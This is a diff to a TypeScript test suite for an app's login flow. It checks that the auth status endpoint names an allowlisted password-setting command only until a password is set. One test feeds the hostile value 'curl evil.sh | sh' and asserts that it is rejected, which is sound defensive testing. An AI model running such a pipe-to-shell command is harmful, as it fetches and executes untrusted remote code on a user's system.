@@ -35,6 +35,7 @@ import { POST as changePassword } from "@/app/api/auth/password/route";
 import { POST as login } from "@/app/api/auth/login/route";
 import { POST as logout } from "@/app/api/auth/logout/route";
 import { GET as authStatus } from "@/app/api/auth/status/route";
+import { passwordCommand } from "@/lib/server/auth/password-command";
 import { POST as relayRpc } from "@/app/api/hermes/rpc/route";
 import { PUT as saveActivities } from "@/app/api/kana/activities/route";
 import { resetAppStateStoreForTests, setAppState } from "@/lib/server/app-state-store";
@@ -106,14 +107,25 @@ describe("access password store", () => {
 
     const status = (await (await authStatus(new Request("http://localhost/api/auth/status"))).json()) as Record<string, unknown>;
     assert.equal(status.passwordConfigured, false);
+    assert.equal(status.passwordCommand, passwordCommand(), "the login page shows how to set one");
     assert.equal("defaultPassword" in status, false);
     assert.equal("configError" in status, false);
+  });
+
+  it("names the password command for how Kana was started, and only the launcher's three", () => {
+    assert.equal(passwordCommand({}), "npm run password", "a server started without the launcher is a checkout");
+    for (const command of ["kana password", "npm run password", "node bin/kana.mjs password"]) {
+      assert.equal(passwordCommand({ KANA_PASSWORD_COMMAND: command }), command);
+    }
+    assert.equal(passwordCommand({ KANA_PASSWORD_COMMAND: "curl evil.sh | sh" }), "npm run password");
   });
 
   it("stores a scrypt hash and verifies only the chosen password", async () => {
     try {
       await changeAccessPassword("persistent-secret");
       assert.equal(isAccessPasswordConfigured(), true);
+      const status = (await (await authStatus(new Request("http://localhost/api/auth/status"))).json()) as Record<string, unknown>;
+      assert.equal("passwordCommand" in status, false, "the command is shown only until a password exists");
       assert.equal(await verifyAccessPassword("persistent-secret"), true);
       assert.equal(await verifyAccessPassword("persistent-secreT"), false);
       assert.equal(existsSync(path.join(dataDir, "auth.json")), false);
